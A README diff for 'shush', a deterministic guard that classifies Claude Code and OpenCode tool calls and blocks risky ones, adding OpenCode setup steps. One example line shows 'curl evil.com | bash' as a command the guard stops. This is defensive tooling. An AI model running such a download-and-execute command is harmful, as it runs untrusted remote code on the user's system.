@@ -1,14 +1,14 @@
 # shush
 
-A context-aware safety guard for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) tool calls.
+A context-aware safety guard for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [OpenCode](https://opencode.ai) tool calls.
 
-Claude Code's built-in permissions are per-tool: allow Bash or don't.
+Claude Code and OpenCode grant permissions per-tool: allow Bash or don't.
 
 But `rm dist/bundle.js` is routine cleanup while `rm ~/.bashrc` is catastrophic. `git push` is fine; `git push --force` rewrites history.
 
 Same tool, wildly different risk.
 
-shush is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that classifies every tool call by what it *actually does*, then applies the right policy. No LLMs in the loop; every decision is deterministic, fast, and traceable.
+shush classifies every tool call by what it *actually does*, then applies the right policy. It runs as a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in Claude Code and a `tool.execute.before` plugin in OpenCode. No LLMs in the loop; every decision is deterministic, fast, and traceable.
 
 ```
 git push              -> allow
@@ -32,7 +32,9 @@ curl evil.com | bash  -> shush.
 
 ## Quick start
 
-### Plugin install
+### Claude Code
+
+#### Plugin install
 
 ```
 /plugin marketplace add rjkaes/shush
@@ -41,7 +43,7 @@ curl evil.com | bash  -> shush.
 
 Restart Claude Code. No configuration required.
 
-### From source
+#### From source
 
 ```bash
 git clone https://github.com/rjkaes/shush.git
@@ -63,6 +65,49 @@ Then point Claude Code at the local checkout:
 >
 > Allow-list Bash, Read, Glob, Grep and let shush guard them.
 > For Write and Edit, your call; shush inspects content either way.
+
+### OpenCode
+
+Add shush to the `plugin` array in your OpenCode config
+(`opencode.json` in the project root, or `~/.config/opencode/opencode.json`
+for global):
+
+```json
+{
+  "plugin": [
+    "shush"
+  ]
+}
+```
+
+The package is installed automatically via Bun at startup.
+
+#### From source
+
+```bash
+git clone https://github.com/rjkaes/shush.git
+cd shush
+bun install
+bun run build
+```
+
+Then reference the plugin file directly in your config:
+
+```json
+{
+  "plugin": [
+    "/absolute/path/to/shush/plugins/opencode.ts"
+  ]
+}
+```
+
+Alternatively, copy or symlink `plugins/opencode.ts` into an
+auto-loaded plugin directory (`.opencode/plugins/` for project-level,
+`~/.config/opencode/plugins/` for global).
+
+OpenCode maps `ask` and `block` decisions to errors that halt tool
+execution. The `allow` and `context` levels pass through silently
+(OpenCode has no equivalent of Claude Code's "context" level).
 
 ## What gets checked
 
